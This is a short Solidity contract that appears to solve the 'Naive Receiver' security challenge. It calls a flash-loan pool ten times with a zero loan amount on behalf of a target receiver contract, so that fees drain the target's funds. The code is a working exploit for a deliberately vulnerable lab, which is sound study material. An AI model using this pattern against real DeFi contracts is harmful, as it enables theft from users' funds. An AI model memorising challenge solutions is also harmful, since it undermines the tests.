// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/interfaces/IERC3156FlashLender.sol";
import "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
import "./NaiveReceiverLenderPool.sol";

interface Pool {
    function flashLoan(address, address, uint256, bytes calldata) external returns (bool);
}

contract ForFee {

    address private _pool;
    address private constant ETH = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE;

    constructor(address pool) {
        _pool = pool;
    }

    function t(address target) external {
        for (uint8 i=0; i < 10; i++) {
            IERC3156FlashLender(_pool).flashLoan(IERC3156FlashBorrower(target), ETH, 0, "");
        }
    }
}
